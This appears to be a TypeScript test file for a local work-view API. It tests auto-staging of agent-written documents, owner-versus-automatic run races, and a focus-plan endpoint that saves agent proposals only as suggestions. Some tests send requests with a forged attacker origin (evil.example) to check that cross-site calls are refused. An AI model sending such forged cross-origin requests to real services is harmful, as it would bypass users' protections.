    const snapshot = await view();
    const board = new Map(toWorkModel(snapshot, Date.now()).requests.map(row => [snapshot.humanRequests.find((raw: any) => raw.id === row.id).groupId, row]));
    expect([board.get(inReview)!.state, board.get(inReview)!.progress.percent]).toEqual(['needs-check', 100]);
    expect([board.get(shipped)!.state, board.get(shipped)!.progress.percent]).toEqual(['shipped', 100]);

    await autoStage('ok', before);
    expect(agent.calls.map(call => call.task.reason)).toEqual(['stage:auto']);
    const staged = Object.fromEntries((await view()).humanRequests.map((request: any) => [request.groupId, request.stages?.brief?.state]));
    expect(staged).toEqual({ [inReview]: 'ready', [shipped]: undefined });
    rmSync((await view()).humanRequests.find((request: any) => request.groupId === inReview).stages.brief.file, { force: true });
  });

  it('is off by default: a refresh that recorded a finished review generates nothing', async () => {
    addConversation(1, 'claude', SESSION, sessionCwd);
    const before = Date.now() - 1000;
    group(key, { ...IN_REVIEW, reviewedThrough: new Date().toISOString(), checkedAt: new Date().toISOString() });
    const agent = fakeAgent('# Brief');
    await start({ runAgent: agent.run });
    expect((await view()).autoStageFormat).toBeNull();
    await autoStage('ok', before);
    expect(agent.calls).toEqual([]);
    expect((await onlyRequest()).stages).toBeUndefined();
  });

  it('once the owner turns it on, makes the chosen format once per review, and saving the setting generates nothing', async () => {
    addConversation(1, 'claude', SESSION, sessionCwd);
    const before = Date.now() - 1000;
    group(key, { ...IN_REVIEW, reviewedThrough: '2026-11-10T10:00:00.000Z', checkedAt: new Date().toISOString() });
    const agent = fakeAgent('# One-pager');
    await start({ runAgent: agent.run });
    expect((await post('/api/work-view/stage/auto', { formatId: 'nope' })).status).toBe(404);
    expect((await post('/api/work-view/stage/auto', { formatId: 'one-pager' }, { Origin: 'https://evil.example' })).status).toBe(403);
    const saved = await post('/api/work-view/stage/auto', { formatId: 'one-pager' });
    expect(saved.status).toBe(200);
    expect((await saved.json() as any).autoStageFormat).toBe('one-pager');
    expect(agent.calls).toEqual([]);

    // The refresh failed, or did not run: nothing.
    await autoStage('failed', before);
    await autoStage('waiting-for-agent', before);
    expect(agent.calls).toEqual([]);

    await autoStage('ok', before);
    expect(agent.calls).toHaveLength(1);
    expect(agent.calls[0].task.reason).toBe('stage:auto');
    const stage = (await onlyRequest()).stages['one-pager'];
    expect(stage).toMatchObject({ state: 'ready', trigger: 'auto', reviewedThrough: '2026-11-10T10:00:00.000Z' });

    // The next refresh re-records the same review version: no second stage.
    await autoStage('ok', before);
    expect(agent.calls).toHaveLength(1);

    // A new review version is a new stage.
    group(key, { ...IN_REVIEW, reviewedThrough: '2026-11-11T09:00:00.000Z', checkedAt: new Date().toISOString() });
    await autoStage('ok', before);
    expect(agent.calls).toHaveLength(2);

    const cleared = await post('/api/work-view/stage/auto', { formatId: null });
    expect((await cleared.json() as any).autoStageFormat).toBeNull();
    group(key, { ...IN_REVIEW, reviewedThrough: '2026-11-12T09:00:00.000Z', checkedAt: new Date().toISOString() });
    await autoStage('ok', before);
    expect(agent.calls).toHaveLength(2);
    rmSync(stage.file, { force: true });
  });

  /** A runner whose every run waits for its own release, then answers with its own document. */
  function gatedAgents(documents: string[]) {
    const calls: AgentTask[] = [];
    const gates = documents.map(() => { let release!: () => void; const opened = new Promise<void>(resolve => { release = resolve; }); return { opened, release }; });
    const run = async (task: AgentTask) => { const index = calls.push(task) - 1; await gates[index].opened; return fakeAgent(documents[index]).run(task); };
    return { calls, run, release: (index: number) => gates[index].release() };
  }

  it('the owner\'s click during an automatic stage\'s read wins the stage: one run, and its file', async () => {
    addConversation(1, 'claude', SESSION, sessionCwd);
    const before = Date.now() - 1000;
    group(key, { ...IN_REVIEW, reviewedThrough: '2026-11-10T10:00:00.000Z', checkedAt: new Date().toISOString() });
    writeFileSync(join(directory, 'settings.json'), JSON.stringify({ CLAUDE_MEM_WORK_VIEW_AUTO_STAGE_FORMAT: 'brief' }));
    const agent = gatedAgents(['# The stage the owner asked for', '# The automatic stage']);
    await start({ runAgent: agent.run });
    const requestId = (await onlyRequest()).id;

    // Automatic staging has chosen this review and is reading the request when the owner clicks Generate.
    const reader = (routes as any).sourceReader;
    const realRead = reader.read.bind(reader);
    let finishRead!: () => void;
    const readHeld = new Promise<void>(resolve => { finishRead = resolve; });
    reader.read = (...args: unknown[]) => { reader.read = realRead; return realRead(...args).then(async (view: unknown) => { await readHeld; return view; }); };
    const automatic = autoStage('ok', before);
    expect((await post('/api/work-view/stage', { requestId, formatId: 'brief', token: token() })).status).toBe(202);
    finishRead();
    agent.release(0); agent.release(1);
    await automatic;
    await routes.whenOwnerRunsSettle();

    expect(agent.calls.map(task => task.reason)).toEqual(['stage:owner']);
    const stage = (await onlyRequest()).stages.brief;
    expect(stage).toMatchObject({ state: 'ready', trigger: 'owner' });
    expect(readFileSync(stage.file, 'utf8')).toBe('# The stage the owner asked for');
    rmSync(stage.file, { force: true });
  });

  it('a run that no longer holds its stage never writes the stage\'s file', async () => {
    addConversation(1, 'claude', SESSION, sessionCwd);
    group(key);
    const agent = gatedAgents(['# From the run that was cut off', '# From the run that holds the stage']);
    await start({ runAgent: agent.run });
    const requestId = (await onlyRequest()).id;
    expect((await post('/api/work-view/stage', { requestId, formatId: 'brief', token: token() })).status).toBe(202);
    // The first run's record is marked interrupted, as a restart does, and the owner clicks again.
    (routes as any).ownerRuns.repairInterrupted();
    await Bun.sleep(5);
    expect((await post('/api/work-view/stage', { requestId, formatId: 'brief', token: token() })).status).toBe(202);
    agent.release(1);
    while ((await onlyRequest()).stages.brief.state !== 'ready') await Bun.sleep(5);
    agent.release(0);
    await routes.whenOwnerRunsSettle();

    const stage = (await onlyRequest()).stages.brief;
    expect(stage.state).toBe('ready');
    expect(readFileSync(stage.file, 'utf8')).toBe('# From the run that holds the stage');
    rmSync(stage.file, { force: true });
  });

  it('a failed automatic stage is not made again for the same review', async () => {
    addConversation(1, 'claude', SESSION, sessionCwd);
    const before = Date.now() - 1000;
    group(key, { ...IN_REVIEW, reviewedThrough: '2026-11-10T10:00:00.000Z', checkedAt: new Date().toISOString() });
    writeFileSync(join(directory, 'settings.json'), JSON.stringify({ CLAUDE_MEM_WORK_VIEW_AUTO_STAGE_FORMAT: 'brief' }));
    const agent = fakeAgent('', 'Claude Code: authentication failed');
    await start({ runAgent: agent.run });
    await autoStage('ok', before);
    expect((await onlyRequest()).stages.brief).toMatchObject({ state: 'failed', trigger: 'auto' });
    await autoStage('ok', before);
    await autoStage('ok', before);
    expect(agent.calls).toHaveLength(1);
  });
});

describe('POST /api/work-view/focus/plan', () => {
  const key = conversation('claude', SESSION);
  const area = (focusAreaId: string, name: string, ownerRank: number) => focusAreaRowFields({
    focusAreaId, name, goal: `Make ${name} good.`, status: 'kept', priorityRank: null, ownerRank, source: 'owner', mergedInto: null, evidence: null, decidedBy: 'owner',
  });
  function seedFocus() {
    addConversation(1, 'claude', SESSION, sessionCwd);
    const rows = [area('fa_viewer', 'Viewer', 1), area('fa_sync', 'Sync', 2),
      placementRowFields({ anchorConversationKey: key, focusAreaId: 'fa_viewer', placedBy: 'owner', evidence: 'moved' })];
    for (const fields of rows) source.prepare('INSERT INTO work_state_entries (id, project, list_name, fields, created_at_epoch) VALUES (?, ?, ?, ?, ?)').run(nextRow++, 'home', 'my-focus', JSON.stringify(fields), Date.now() - 5000 + nextRow);
  }
  const PLAN = JSON.stringify({ proposals: [
    { kind: 'reorder', focusAreaIds: ['fa_sync', 'fa_viewer'], moves: [{ focusAreaId: 'fa_sync', reason: 'Nothing in Viewer waits on you.' }] },
    { kind: 'goal', focusAreaId: 'fa_viewer', goal: 'Every agent chat can be answered from the board.', reason: 'The goal names no outcome.' },
    { kind: 'notes', focusAreaId: 'fa_viewer', notes: 'A kind this worker has no owner action for.', quotes: ['answer an agent from the board'] },
    { kind: 'next-asks', focusAreaId: 'fa_viewer', asks: [{ text: 'Wire the answer box.', reason: 'The route exists.' }, { text: 'b', reason: 'b' }, { text: 'c', reason: 'c' }, { text: 'd', reason: 'd' }] },
    { kind: 'goal', focusAreaId: 'fa_missing', goal: 'x', reason: 'y' },
    { kind: 'delete-area', focusAreaId: 'fa_viewer' },
  ] });

  it('saves the checked proposals as suggestions and applies none of them', async () => {
    seedFocus();
    const agent = fakeAgent(`Here is the plan:\n${PLAN}`);
    await start({ runAgent: agent.run });
    const rowsBefore = myFocusRows().count;
    const response = await post('/api/work-view/focus/plan', { focusAreaId: null, token: token() });
    expect(response.status).toBe(202);
    await routes.whenOwnerRunsSettle();
    expect(agent.calls).toHaveLength(1);
    expect(agent.calls[0].task.stayOnFirstUsableAgent).toBe(true);
    expect(agent.calls[0].prompts).toHaveLength(1);
    expect(agent.calls[0].prompts[0]).toContain('# Focus Plan');
    expect(agent.calls[0].prompts[0]).toContain(ASK);

    const { plan } = await (await fetch(`${origin}/api/work-view/focus/plan`)).json() as any;
    expect(plan.state).toBe('ready');
    expect(plan.focusAreaId).toBeNull();
    expect(plan.proposals.map((proposal: any) => [proposal.kind, proposal.focusAreaId ?? null])).toEqual([['reorder', null], ['goal', 'fa_viewer'], ['next-asks', 'fa_viewer']]);
    expect(plan.proposals[2].asks).toHaveLength(3);
    expect(plan.skipped).toHaveLength(3);
    expect(plan.skipped.join('\n')).toMatch(/\(notes\): kind must be one of reorder, goal, next-asks/);

    // Suggestions only: the focus areas are exactly as they were.
    expect(myFocusRows().count).toBe(rowsBefore);
    const areas = (await view()).focusAreas;
    expect(areas.map((item: any) => [item.focusAreaId, item.goal, item.ownerRank])).toEqual([['fa_viewer', 'Make Viewer good.', 1], ['fa_sync', 'Make Sync good.', 2]]);
    const overview = await (await fetch(`${origin}/api/work-view/overview`)).json() as any;
    expect(overview.model.focusPlan).toEqual({ state: 'ready', focusAreaId: null, startedAt: plan.startedAt, generatedAt: plan.generatedAt, error: null, proposals: 3 });
  });

  it('plans one area without an order', async () => {
    seedFocus();
    const agent = fakeAgent(JSON.stringify({ proposals: [
      { kind: 'reorder', focusAreaIds: ['fa_sync', 'fa_viewer'], moves: [{ focusAreaId: 'fa_sync', reason: 'r' }] },
    ] }));
    await start({ runAgent: agent.run });
    expect((await post('/api/work-view/focus/plan', { focusAreaId: 'fa_missing', token: token() })).status).toBe(404);
    expect((await post('/api/work-view/focus/plan', { focusAreaId: 'fa_viewer', token: token() })).status).toBe(202);
    await routes.whenOwnerRunsSettle();
    const { plan } = await (await fetch(`${origin}/api/work-view/focus/plan`)).json() as any;
    expect(plan).toMatchObject({ state: 'ready', focusAreaId: 'fa_viewer', proposals: [] });
    expect(plan.skipped.join('\n')).toMatch(/planned only across all areas/);
    expect(agent.calls[0].prompts[0]).not.toContain('fa_sync');
  });

  it('never starts a second run for the same click, and a failed run stays failed with no later run', async () => {
    seedFocus();
    const agent = fakeAgent('I could not produce a plan.');
    await start({ runAgent: agent.run });
    const body = { focusAreaId: null, token: token() };
    const together = await Promise.all([post('/api/work-view/focus/plan', body), post('/api/work-view/focus/plan', body)]);
    expect((await Promise.all(together.map(response => response.json()))).map(answer => (answer as { state: string }).state).sort()).toEqual(['duplicate', 'started']);
    await routes.whenOwnerRunsSettle();
    expect(await (await post('/api/work-view/focus/plan', body)).json()).toEqual({ state: 'duplicate' });
    expect((await view()).focusPlan).toMatchObject({ state: 'failed', error: expect.stringMatching(/no JSON object/), proposals: [] });
    await Bun.sleep(80);
    await stop();
    await start({ runAgent: agent.run });
    await Bun.sleep(80);
    expect((await view()).focusPlan.state).toBe('failed');
    expect(agent.calls).toHaveLength(1);
    expect((await post('/api/work-view/focus/plan', { focusAreaId: null, token: 'bad token' })).status).toBe(400);
    expect((await post('/api/work-view/focus/plan', { focusAreaId: null, token: token() }, { Origin: 'https://evil.example' })).status).toBe(403);
  });
});
